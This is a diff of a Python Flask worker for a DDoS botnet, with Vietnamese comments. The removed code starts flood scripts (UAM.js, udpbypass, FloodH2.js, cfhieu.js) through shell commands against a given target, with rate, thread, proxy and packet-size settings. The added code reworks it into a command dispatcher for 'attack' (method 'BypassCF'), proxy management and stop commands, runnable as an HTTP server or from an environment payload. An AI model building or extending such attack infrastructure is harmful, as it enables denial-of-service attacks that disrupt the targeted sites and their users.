@@ -1,120 +1,101 @@
-from flask import Flask, jsonify, request
-import os
-import subprocess
-import time
-import threading
-import json
+# -*- coding: utf-8 -*-
+import os, sys, json, time
+from typing import Any, Dict
+from flask import Flask, request, jsonify
+
+# ========= (A) HANDLERS: móc vào logic thật của bạn =========
+
+def handle_attack(target: str, duration: int, method: str = "BypassCF", **kwargs) -> Dict[str, Any]:
+    # TODO: gọi hàm tấn công thật của bạn ở đây
+    return {
+        "status": "running",
+        "task_id": f"ga-{int(time.time())}",
+        "target": target,
+        "duration": duration,
+        "method": method,
+        "worker": os.getenv("WORKER_ID", "1")
+    }
+
+def handle_add_proxy(proxy: str) -> Dict[str, Any]:
+    # TODO: thêm proxy vào kho của bạn
+    return {"ok": True, "added": proxy}
+
+def handle_check_proxies() -> Dict[str, Any]:
+    # TODO: kiểm tra proxy
+    return {"ok": True, "alive": 0}
+
+def handle_stop(task_id: str) -> Dict[str, Any]:
+    # TODO: dừng task theo task_id
+    return {"ok": True, "stopped": task_id}
+
+def process_task(payload: Dict[str, Any]) -> Dict[str, Any]:
+    """
+    payload mẫu:
+      {"cmd":"attack","args":{"target":"https://...","duration":120,"method":"BypassCF"}}
+      {"cmd":"addproxy","args":{"proxy":"http://1.2.3.4:8080"}}
+    """
+    cmd  = payload.get("cmd")
+    args = payload.get("args", {}) or {}
+
+    if cmd == "attack":
+        target   = args.get("target")
+        duration = int(args.get("duration", 60))
+        method   = args.get("method", "BypassCF")
+        return handle_attack(target, duration, method, **args)
+
+    if cmd == "addproxy":
+        return handle_add_proxy(args.get("proxy", ""))
+
+    if cmd == "check_proxies":
+        return handle_check_proxies()
+
+    if cmd == "stop":
+        return handle_stop(args.get("task_id", ""))
+
+    return {"ok": False, "error": f"unknown cmd: {cmd}", "payload": payload}
+
+# ========= (B) VPS MODE (HTTP) =========
 
 app = Flask(__name__)
-running_tasks = {}  # Theo dõi các tác vụ đang chạy (task_id: process)
 
-# Đường dẫn mặc định cho file proxy
-PROXY_FILE = "proxy.txt"
+@app.post("/execute")
+def http_execute():
+    data = request.get_json(force=True) or {}
+    # Nếu trước đây body không có "cmd", bạn có thể map sang cmd mặc định tại đây.
+    res = process_task(data)
+    return jsonify(res), 200
 
-@app.route('/status')
-def status():
-    """Trả về trạng thái của VPS (idle hoặc running)."""
-    task_id = request.args.get('task_id')
-    if task_id and task_id in running_tasks:
-        return jsonify({"status": "running"})
-    return jsonify({"status": "idle"})
+@app.get("/status")
+def http_status():
+    return jsonify({"ok": True, "mode": "vps", "time": int(time.time())}), 200
 
-@app.route('/execute', methods=['POST'])
-def execute():
-    """Thực thi lệnh tấn công dựa trên dữ liệu nhận được."""
+# ========= (C) GA MODE (ENV) =========
+
+def run_ga_mode() -> int:
+    pj = os.getenv("PAYLOAD_JSON", "").strip()
+    if not pj or pj in ("{}", "null"):
+        return 1
     try:
-        data = request.get_json()
-        if not data:
-            return jsonify({"status": "error", "message": "No data provided"}), 400
-
-        script = data.get('script')
-        target = data.get('target')
-        time_ = int(data.get('time', 60))  # Mặc định 60 giây nếu không có
-
-        # Xây dựng lệnh cmd tùy theo script
-        if script == "UAM.js":
-            rate = data.get('rate', '100')
-            thread = data.get('thread', '8')
-            cookiecount = data.get('cookiecount', '6')
-            proxyfile = data.get('proxyfile', PROXY_FILE)
-            cmd = f"node {script} {target} {time_} {rate} {thread} {cookiecount}"
-        elif script == "udpbypass":
-            port = data.get('port')
-            if not port:
-                return jsonify({"status": "error", "message": "Port required for UDPBypass"}), 400
-            packet_size = data.get('packet_size', '1472')
-            burst = data.get('burst', '1024')
-            cmd = f"./{script} {target} {port} {time_} {packet_size} {burst}"
-        elif script == "FloodH2.js":
-            rate = data.get('rate', '64')
-            thread = data.get('thread', '5')
-            proxyfile = data.get('proxyfile', PROXY_FILE)
-            cmd = f"node {script} {target} {time_} {rate} {thread} {proxyfile}"
-        elif script == "cfhieu.js":
-            rate = data.get('rate', '64')
-            thread = data.get('thread', '5')
-            proxyfile = data.get('proxyfile', PROXY_FILE)
-            cmd = f"node {script} {target} {time_} {rate} {thread} {proxyfile}"
-        else:
-            return jsonify({"status": "error", "message": f"Unsupported script: {script}"}), 400
-
-        # Kiểm tra file script tồn tại
-        if not os.path.exists(script):
-            return jsonify({"status": "error", "message": f"Script {script} not found"}), 404
-
-        # Tạo task_id dựa trên thời gian
-        task_id = str(time.time())
-        running_tasks[task_id] = None
-
-        # Chạy lệnh
-        process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        running_tasks[task_id] = process
-
-        # Theo dõi và dọn dẹp sau khi hoàn tất
-        def cleanup(task_id, process):
-            process.wait()
-            if task_id in running_tasks:
-                del running_tasks[task_id]
-            output, error = process.communicate()
-            if error:
-                logging.error(f"Error in task {task_id}: {error.decode()}")
-            logging.info(f"Task {task_id} completed with output: {output.decode()}")
-
-        threading.Thread(target=cleanup, args=(task_id, process)).start()
-
-        return jsonify({"status": "success", "task_id": task_id})
-
+        payload = json.loads(pj)
     except Exception as e:
-        return jsonify({"status": "error", "message": str(e)}), 500
+        print("Invalid PAYLOAD_JSON:", e)
+        return 2
 
-@app.route('/check_proxies')
-def check_proxies():
-    """Kiểm tra sự tồn tại của file proxy.txt."""
-    if os.path.exists(PROXY_FILE):
-        return jsonify({"status": "success", "message": "proxy.txt exists"}), 200
-    else:
-        return jsonify({"status": "error", "message": "proxy.txt not found"}), 404
+    wid = os.getenv("WORKER_ID", "1")
+    print(f"[GA] Worker #{wid} received payload: {payload}")
+    res = process_task(payload)
+    print(json.dumps(res, ensure_ascii=False))
+    return 0
 
-@app.route('/update_proxies', methods=['POST'])
-def update_proxies():
-    """Cập nhật danh sách proxy vào file proxy.txt (xóa cũ và thêm mới)."""
-    try:
-        data = request.get_json()
-        proxies = data.get('proxies', [])
-        if not proxies:
-            return jsonify({"status": "error", "message": "No proxies provided"}), 400
+# ========= (D) ENTRY =========
 
-        with open(PROXY_FILE, 'w') as f:
-            for proxy in proxies:
-                f.write(f"{proxy.strip()}\n")
-        return jsonify({"status": "success", "message": "Proxies updated"}), 200
-    except Exception as e:
-        return jsonify({"status": "error", "message": str(e)}), 500
+if __name__ == "__main__":
+    # Ép GA-mode nếu có FORCE_GA=1 hoặc có PAYLOAD_JSON
+    if os.getenv("FORCE_GA") == "1" or os.getenv("PAYLOAD_JSON", "").strip():
+        code = run_ga_mode()
+        sys.exit(code)     # QUAN TRỌNG: không mở Flask sau khi chạy GA-mode
 
-if __name__ == '__main__':
-    # Thiết lập logging cơ bản
-    import logging
-    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
-
-    # Chạy server trên port 5000
-    app.run(host='0.0.0.0', port=5000)
+    # Mặc định: VPS mode (HTTP)
+    print("[VPS] mode: starting Flask")
+    port = int(os.getenv("PORT", "5000"))
+    app.run(host="0.0.0.0", port=port)
